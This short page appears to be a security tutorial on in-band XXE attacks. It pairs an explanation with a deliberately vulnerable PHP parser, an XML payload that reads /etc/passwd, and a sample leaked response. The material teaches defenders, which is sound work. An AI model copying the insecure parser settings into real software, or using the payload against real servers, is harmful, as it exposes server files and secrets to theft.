Attack Vector

Reading Local Files with In-Band XXE

In-band XXE attacks occur when the content of an external entity, typically a sensitive file, is directly returned within the application's HTTP response, allowing attackers to read arbitrary files on the server.

How In-Band Works

The XML parser processes the external entity and directly substitutes its content into the XML document, which is then returned in the application's response.

Common Targets

Attackers often target system files like /etc/passwd, configuration files (e.g., db.conf), or application source code to gather sensitive information.

Key Takeaway

In-band XXE provides immediate visibility into server files, making it a powerful tool for reconnaissance and direct data exfiltration.

Vulnerable PHP Application & Attack
<?php
    libxml_disable_entity_loader(false); // DANGER: Enables external entity loading
    $xml_data = file_get_contents('php://input');
    $dom = new DOMDocument();
    $dom->loadXML($xml_data, LIBXML_NOENT | LIBXML_DTDLOAD); // Enables entity substitution & DTD loading
    echo $dom->saveXML();
?>

// Attacker's XML Payload:
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<data>&xxe;</data>

// Server's Response (example snippet):
<data>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...</data>
